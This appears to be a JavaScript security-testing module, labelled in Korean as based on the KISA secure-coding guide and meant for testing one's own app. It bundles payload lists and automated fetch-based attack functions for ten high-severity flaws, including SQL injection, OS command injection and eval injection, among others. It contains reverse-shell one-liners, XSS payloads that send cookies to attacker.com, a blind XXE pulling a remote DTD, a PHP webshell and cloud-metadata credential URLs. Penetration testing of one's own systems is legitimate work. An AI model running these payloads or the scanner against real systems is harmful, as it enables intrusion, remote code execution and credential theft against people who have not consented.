/**
 * KISA JavaScript 시큐어코딩 가이드 기반
 * 고위험(7점 이상) 취약점 공격 테스트 코드
 *
 * 자체 앱 보안 테스트 전용
 * CWE/CVSS 기준 위험도 7.0 이상 취약점
 */

// ============================================================
// 1. SQL Injection (CWE-89) - CVSS 9.8 Critical
// ============================================================
export const SQL_INJECTION = {
  name: 'SQL Injection',
  cwe: 'CWE-89',
  cvss: 9.8,
  severity: 'Critical',

  payloads: {
    // 인증 우회
    authBypass: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin'--",
      "') OR ('1'='1",
      "' OR 1=1#",
      "' OR 'x'='x",
      "1' OR '1'='1' /*",
      "' OR ''='",
    ],

    // UNION 기반 데이터 추출
    unionBased: [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL, NULL--",
      "' UNION SELECT NULL, NULL, NULL--",
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT table_name, NULL FROM information_schema.tables--",
      "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
      "1' UNION SELECT ALL FROM users WHERE '1'='1",
    ],

    // 에러 기반
    errorBased: [
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
      "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--",
    ],

    // 시간 기반 Blind
    timeBased: [
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
      "' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],

    // Boolean 기반 Blind
    booleanBased: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND SUBSTRING(username,1,1)='a'--",
      "' AND ASCII(SUBSTRING(password,1,1))>97--",
    ],
  },

  // 테스트 함수
  async test(targetUrl, inputField = 'username') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 3)) { // 각 카테고리별 3개씩
        try {
          const formData = new FormData();
          formData.append(inputField, payload);

          const startTime = Date.now();
          const response = await fetch(targetUrl, {
            method: 'POST',
            body: formData,
            credentials: 'include',
          });
          const elapsed = Date.now() - startTime;
          const text = await response.text();

          // 취약점 판정
          const vulnerable =
            (category === 'authBypass' && (response.ok || text.includes('welcome') || text.includes('dashboard'))) ||
            (category === 'timeBased' && elapsed > 4000) ||
            (category === 'errorBased' && (text.includes('SQL') || text.includes('syntax') || text.includes('mysql'))) ||
            (category === 'unionBased' && (text.includes('username') || text.includes('password')));

          results.push({
            category,
            payload: payload.substring(0, 50),
            status: response.status,
            elapsed,
            vulnerable,
            evidence: vulnerable ? text.substring(0, 200) : null,
          });
        } catch (error) {
          results.push({
            category,
            payload: payload.substring(0, 50),
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 2. OS Command Injection (CWE-78) - CVSS 9.8 Critical
// ============================================================
export const OS_COMMAND_INJECTION = {
  name: 'OS Command Injection',
  cwe: 'CWE-78',
  cvss: 9.8,
  severity: 'Critical',

  payloads: {
    // 기본 명령어 삽입
    basic: [
      '; ls -la',
      '| ls -la',
      '`ls -la`',
      '$(ls -la)',
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '& whoami',
      '&& whoami',
      '|| whoami',
    ],

    // 인코딩 우회
    encoded: [
      '%3Bls',
      '%7Cls',
      '%26whoami',
      '${IFS}ls',
      ';{ls,-la}',
      '\nls\n',
      '\r\nls\r\n',
    ],

    // Windows 명령어
    windows: [
      '& dir',
      '| dir',
      '; dir',
      '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
      '| net user',
      '& whoami /all',
    ],

    // 역쉘 (탐지 테스트용)
    reverseShell: [
      '; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
      '| nc -e /bin/sh 127.0.0.1 4444',
      '`python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'127.0.0.1\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"`',
    ],

    // 시간 기반 탐지
    timeBased: [
      '; sleep 5',
      '| sleep 5',
      '`sleep 5`',
      '$(sleep 5)',
      '& ping -c 5 127.0.0.1',
    ],
  },

  async test(targetUrl, inputField = 'filename') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      if (category === 'reverseShell') continue; // 역쉘은 실제 테스트 안함

      for (const payload of payloads.slice(0, 2)) {
        try {
          const startTime = Date.now();
          const response = await fetch(`${targetUrl}?${inputField}=${encodeURIComponent(payload)}`);
          const elapsed = Date.now() - startTime;
          const text = await response.text();

          const vulnerable =
            (category === 'timeBased' && elapsed > 4000) ||
            text.includes('root:') ||
            text.includes('bin/') ||
            text.includes('total ') ||
            text.includes('drwx') ||
            text.includes('Directory of');

          results.push({
            category,
            payload: payload.substring(0, 50),
            elapsed,
            vulnerable,
            evidence: vulnerable ? text.substring(0, 200) : null,
          });
        } catch (error) {
          results.push({
            category,
            payload: payload.substring(0, 50),
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 3. Code Injection / Eval Injection (CWE-94/95) - CVSS 9.8
// ============================================================
export const CODE_INJECTION = {
  name: 'Code Injection (eval)',
  cwe: 'CWE-94',
  cvss: 9.8,
  severity: 'Critical',

  payloads: {
    // eval() 공격
    evalBased: [
      'require("child_process").execSync("whoami").toString()',
      'process.mainModule.require("child_process").execSync("id")',
      'global.process.mainModule.require("child_process").execSync("ls")',
      'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("whoami")',
    ],

    // setTimeout/setInterval 공격
    timerBased: [
      'setTimeout(function(){/* malicious */}, 0)',
      'setInterval(function(){/* malicious */}, 1000)',
    ],

    // Function 생성자 공격
    functionConstructor: [
      'new Function("return process.env")()',
      '(function(){return this.constructor.constructor("return process.env")();})()',
      '[].constructor.constructor("return process.env")()',
    ],

    // 템플릿 리터럴 공격
    templateLiteral: [
      '${process.env}',
      '${require("fs").readFileSync("/etc/passwd")}',
      '${7*7}', // 템플릿 인젝션 탐지용
    ],

    // Node.js VM 탈출
    vmEscape: [
      'this.constructor.constructor("return this.process.env")()',
      'const process = this.constructor.constructor("return this.process")(); process.mainModule.require("child_process").execSync("whoami");',
    ],
  },

  async test(targetUrl, inputField = 'expression') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 2)) {
        try {
          const response = await fetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ [inputField]: payload }),
          });
          const text = await response.text();

          const vulnerable =
            text.includes('root') ||
            text.includes('uid=') ||
            text.includes('PATH=') ||
            text.includes('49') || // 7*7 = 49
            text.includes('HOME=');

          results.push({
            category,
            payload: payload.substring(0, 60),
            vulnerable,
            evidence: vulnerable ? text.substring(0, 200) : null,
          });
        } catch (error) {
          results.push({
            category,
            payload: payload.substring(0, 60),
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 4. XSS - Cross-Site Scripting (CWE-79) - CVSS 7.1
// ============================================================
export const XSS_ATTACK = {
  name: 'Cross-Site Scripting (XSS)',
  cwe: 'CWE-79',
  cvss: 7.1,
  severity: 'High',

  payloads: {
    // Reflected XSS
    reflected: [
      '<script>alert("XSS")</script>',
      '<script>alert(document.domain)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      "'-alert(1)-'",
      '<iframe src="javascript:alert(1)">',
    ],

    // Stored XSS
    stored: [
      '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
      '<img src=x onerror="new Image().src=\'http://attacker.com/?c=\'+document.cookie">',
      '<script>document.location="http://attacker.com/?c="+document.cookie</script>',
    ],

    // DOM XSS
    domBased: [
      '#<script>alert(1)</script>',
      'javascript:alert(document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'javascript:/*--></title></style></textarea></script><svg onload=alert(1)>//',
    ],

    // 필터 우회
    filterBypass: [
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<SCRIPT>alert(1)</SCRIPT>',
      '<ScRiPt>alert(1)</ScRiPt>',
      '<script/src=data:,alert(1)>',
      '<svg/onload=alert(1)>',
      '<img src=1 onerror\x00=alert(1)>',
      '<img src=1 onerror\x0b=alert(1)>',
      '<%00script>alert(1)</script>',
      '<script>alert(1)//</script>',
    ],

    // 인코딩 우회
    encodingBypass: [
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
    ],

    // React 특화
    reactSpecific: [
      '{{constructor.constructor("alert(1)")()}}',
      '{dangerouslySetInnerHTML: {__html: "<img src=x onerror=alert(1)>"}}',
    ],
  },

  async test(targetUrl, inputField = 'search') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 3)) {
        try {
          const response = await fetch(`${targetUrl}?${inputField}=${encodeURIComponent(payload)}`);
          const text = await response.text();

          // 응답에 페이로드가 이스케이프 없이 포함되어 있는지 확인
          const unescapedPayload = payload
            .replace(/&lt;/g, '<')
            .replace(/&gt;/g, '>')
            .replace(/&quot;/g, '"');

          const vulnerable =
            text.includes(payload) ||
            text.includes(unescapedPayload) ||
            (text.includes('<script>') && text.includes('alert'));

          results.push({
            category,
            payload: payload.substring(0, 50),
            vulnerable,
            reflected: text.includes(payload),
          });
        } catch (error) {
          results.push({
            category,
            payload: payload.substring(0, 50),
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 5. SSRF - Server-Side Request Forgery (CWE-918) - CVSS 9.1
// ============================================================
export const SSRF_ATTACK = {
  name: 'Server-Side Request Forgery (SSRF)',
  cwe: 'CWE-918',
  cvss: 9.1,
  severity: 'Critical',

  payloads: {
    // 내부 네트워크 스캔
    internalNetwork: [
      'http://127.0.0.1',
      'http://localhost',
      'http://0.0.0.0',
      'http://[::1]',
      'http://127.0.0.1:22',
      'http://127.0.0.1:3306',
      'http://127.0.0.1:6379',
      'http://192.168.1.1',
      'http://10.0.0.1',
      'http://172.16.0.1',
    ],

    // 클라우드 메타데이터
    cloudMetadata: [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://169.254.169.254/metadata/v1/',
      'http://169.254.169.254/opc/v1/instance/',
    ],

    // 프로토콜 핸들러
    protocolHandlers: [
      'file:///etc/passwd',
      'file:///c:/windows/win.ini',
      'dict://127.0.0.1:11211/stats',
      'gopher://127.0.0.1:6379/_INFO',
      'ftp://127.0.0.1',
    ],

    // URL 우회
    urlBypass: [
      'http://127.0.0.1.nip.io',
      'http://spoofed.burpcollaborator.net',
      'http://127.1',
      'http://0177.0.0.1', // 8진수
      'http://2130706433', // 10진수
      'http://0x7f.0x0.0x0.0x1', // 16진수
      'http://127.0.0.1%00.example.com',
      'http://example.com@127.0.0.1',
    ],
  },

  async test(targetUrl, inputField = 'url') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 3)) {
        try {
          const response = await fetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ [inputField]: payload }),
          });
          const text = await response.text();

          const vulnerable =
            text.includes('root:') ||
            text.includes('ami-') ||
            text.includes('instance-id') ||
            text.includes('security-credentials') ||
            text.includes('[mysqld]') ||
            text.includes('Redis') ||
            response.status === 200;

          results.push({
            category,
            payload,
            status: response.status,
            vulnerable,
            evidence: vulnerable ? text.substring(0, 200) : null,
          });
        } catch (error) {
          results.push({
            category,
            payload,
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 6. Path Traversal (CWE-22) - CVSS 7.5
// ============================================================
export const PATH_TRAVERSAL = {
  name: 'Path Traversal',
  cwe: 'CWE-22',
  cvss: 7.5,
  severity: 'High',

  payloads: {
    // 기본 경로 조작
    basic: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc/passwd',
      '..%252f..%252f..%252fetc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    ],

    // Null 바이트 인젝션
    nullByte: [
      '../../../etc/passwd%00.jpg',
      '../../../etc/passwd\x00.jpg',
      '....//....//etc/passwd%00.png',
    ],

    // 인코딩 우회
    encoded: [
      '..%c0%af..%c0%af..%c0%afetc/passwd',
      '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
      '..%c1%9c..%c1%9c..%c1%9cwindows/win.ini',
      '%252e%252e%252f%252e%252e%252fetc/passwd',
    ],

    // 절대 경로
    absolute: [
      '/etc/passwd',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      '/proc/self/environ',
      '/proc/self/cmdline',
    ],
  },

  async test(targetUrl, inputField = 'file') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 2)) {
        try {
          const response = await fetch(`${targetUrl}?${inputField}=${encodeURIComponent(payload)}`);
          const text = await response.text();

          const vulnerable =
            text.includes('root:') ||
            text.includes('[extensions]') ||
            text.includes('PATH=') ||
            text.includes('[fonts]');

          results.push({
            category,
            payload: payload.substring(0, 40),
            vulnerable,
            evidence: vulnerable ? text.substring(0, 200) : null,
          });
        } catch (error) {
          results.push({
            category,
            payload: payload.substring(0, 40),
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 7. Deserialization Attack (CWE-502) - CVSS 9.8
// ============================================================
export const DESERIALIZATION_ATTACK = {
  name: 'Insecure Deserialization',
  cwe: 'CWE-502',
  cvss: 9.8,
  severity: 'Critical',

  payloads: {
    // Node.js node-serialize 공격
    nodeSerialize: [
      '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}',
      '{"rce":"_$$ND_FUNC$$_function(){return process.env}()"}',
    ],

    // JSON 프로토타입 오염
    prototypePolllution: [
      '{"__proto__":{"isAdmin":true}}',
      '{"constructor":{"prototype":{"isAdmin":true}}}',
      '{"__proto__":{"toString":"polluted"}}',
      '{"__proto__":{"valueOf":"polluted"}}',
    ],

    // YAML 공격 (js-yaml 취약)
    yamlAttack: [
      '!!js/function "function(){return process.env}"',
      '!!js/eval "process.exit()"',
    ],
  },

  async test(targetUrl, inputField = 'data') {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads) {
        try {
          const response = await fetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload,
          });
          const text = await response.text();

          const vulnerable =
            text.includes('uid=') ||
            text.includes('PATH=') ||
            text.includes('"isAdmin":true') ||
            response.status === 500; // 역직렬화 오류

          results.push({
            category,
            payload: payload.substring(0, 50),
            status: response.status,
            vulnerable,
          });
        } catch (error) {
          results.push({
            category,
            payload: payload.substring(0, 50),
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 8. XXE - XML External Entity (CWE-611) - CVSS 7.5
// ============================================================
export const XXE_ATTACK = {
  name: 'XML External Entity (XXE)',
  cwe: 'CWE-611',
  cvss: 7.5,
  severity: 'High',

  payloads: {
    // 파일 읽기
    fileRead: [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
    ],

    // SSRF via XXE
    ssrf: [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>`,
    ],

    // DoS (Billion Laughs)
    dos: [
      `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>`,
    ],

    // Blind XXE
    blind: [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>`,
    ],
  },

  async test(targetUrl) {
    const results = [];

    for (const [category, payloads] of Object.entries(this.payloads)) {
      if (category === 'dos') continue; // DoS 공격은 스킵

      for (const payload of payloads) {
        try {
          const response = await fetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/xml' },
            body: payload,
          });
          const text = await response.text();

          const vulnerable =
            text.includes('root:') ||
            text.includes('[extensions]') ||
            text.includes('ami-') ||
            text.includes('meta-data');

          results.push({
            category,
            vulnerable,
            evidence: vulnerable ? text.substring(0, 200) : null,
          });
        } catch (error) {
          results.push({
            category,
            error: error.message,
            vulnerable: false,
          });
        }
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 9. CSRF - Cross-Site Request Forgery (CWE-352) - CVSS 8.0
// ============================================================
export const CSRF_ATTACK = {
  name: 'Cross-Site Request Forgery (CSRF)',
  cwe: 'CWE-352',
  cvss: 8.0,
  severity: 'High',

  // CSRF 테스트 HTML 페이지 생성
  generateTestPage(targetUrl, method = 'POST', params = {}) {
    const formInputs = Object.entries(params)
      .map(([name, value]) => `<input type="hidden" name="${name}" value="${value}" />`)
      .join('\n        ');

    return `
<!DOCTYPE html>
<html>
<head><title>CSRF Test</title></head>
<body>
  <h1>CSRF Vulnerability Test</h1>
  <p>이 페이지로 CSRF 취약점을 테스트합니다.</p>

  <!-- Form 기반 CSRF -->
  <form id="csrf-form" action="${targetUrl}" method="${method}">
    ${formInputs}
    <button type="submit">Submit (Manual Test)</button>
  </form>

  <!-- Auto-submit (주석 해제하여 사용) -->
  <!--
  <script>document.getElementById('csrf-form').submit();</script>
  -->

  <!-- Fetch 기반 CSRF Test -->
  <script>
    async function testCSRF() {
      try {
        const response = await fetch('${targetUrl}', {
          method: '${method}',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(${JSON.stringify(params)})
        });
        alert('요청 성공: ' + response.status + ' - CSRF 취약점 가능');
      } catch (e) {
        alert('요청 차단됨 (CORS): ' + e.message);
      }
    }
  </script>
  <button onclick="testCSRF()">Fetch API Test</button>

  <!-- Image 기반 CSRF (GET) -->
  <img src="${targetUrl}?${new URLSearchParams(params)}" style="display:none" />
</body>
</html>`;
  },

  async test(targetUrl, method = 'POST', params = {}) {
    const results = [];

    try {
      // 1. CSRF 토큰 없이 요청 테스트
      const response = await fetch(targetUrl, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params),
        credentials: 'include',
      });

      const csrfTokenMissing = response.ok || response.status !== 403;

      results.push({
        test: 'CSRF Token Check',
        vulnerable: csrfTokenMissing,
        status: response.status,
        message: csrfTokenMissing
          ? 'CSRF 토큰 없이 요청 성공 - 취약'
          : 'CSRF 토큰 필요 - 안전',
      });

      // 2. SameSite 쿠키 체크
      const cookieHeader = response.headers.get('set-cookie');
      const hasSameSite = cookieHeader && cookieHeader.toLowerCase().includes('samesite');

      results.push({
        test: 'SameSite Cookie',
        vulnerable: !hasSameSite,
        message: hasSameSite
          ? 'SameSite 쿠키 설정됨 - 안전'
          : 'SameSite 쿠키 미설정 - 취약 가능',
      });

    } catch (error) {
      results.push({
        test: 'CSRF Test',
        error: error.message,
        vulnerable: false,
        message: 'CORS 정책에 의해 차단됨',
      });
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
      testPage: this.generateTestPage(targetUrl, method, params),
    };
  }
};


// ============================================================
// 10. File Upload (CWE-434) - CVSS 9.8
// ============================================================
export const FILE_UPLOAD_ATTACK = {
  name: 'Unrestricted File Upload',
  cwe: 'CWE-434',
  cvss: 9.8,
  severity: 'Critical',

  payloads: {
    // 웹쉘 파일명
    webshellNames: [
      'shell.php',
      'shell.php.jpg',
      'shell.php%00.jpg',
      'shell.pHp',
      'shell.php5',
      'shell.phtml',
      'shell.asp',
      'shell.aspx',
      'shell.jsp',
      '.htaccess',
    ],

    // 매직 바이트 우회
    magicByteBypass: [
      { ext: '.php', magic: 'GIF89a<?php system($_GET["cmd"]); ?>' },
      { ext: '.php', magic: '\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>' },
    ],

    // Content-Type 우회
    contentTypeBypass: [
      { name: 'shell.php', contentType: 'image/jpeg' },
      { name: 'shell.php', contentType: 'image/gif' },
      { name: 'shell.php', contentType: 'image/png' },
    ],
  },

  async test(targetUrl) {
    const results = [];

    // 각 우회 기법 테스트
    for (const filename of this.payloads.webshellNames.slice(0, 5)) {
      try {
        const formData = new FormData();
        const blob = new Blob(['<?php echo "vulnerable"; ?>'], { type: 'text/plain' });
        formData.append('file', blob, filename);

        const response = await fetch(targetUrl, {
          method: 'POST',
          body: formData,
        });

        const text = await response.text();
        const vulnerable = response.ok && !text.includes('error') && !text.includes('not allowed');

        results.push({
          filename,
          status: response.status,
          vulnerable,
          message: vulnerable ? '업로드 허용됨 - 취약' : '업로드 차단됨',
        });
      } catch (error) {
        results.push({
          filename,
          error: error.message,
          vulnerable: false,
        });
      }
    }

    return {
      name: this.name,
      cwe: this.cwe,
      cvss: this.cvss,
      results,
      vulnerable: results.some(r => r.vulnerable),
    };
  }
};


// ============================================================
// 모든 고위험 취약점 내보내기
// ============================================================
export const HIGH_SEVERITY_ATTACKS = {
  SQL_INJECTION,
  OS_COMMAND_INJECTION,
  CODE_INJECTION,
  XSS_ATTACK,
  SSRF_ATTACK,
  PATH_TRAVERSAL,
  DESERIALIZATION_ATTACK,
  XXE_ATTACK,
  CSRF_ATTACK,
  FILE_UPLOAD_ATTACK,
};

export default HIGH_SEVERITY_ATTACKS;
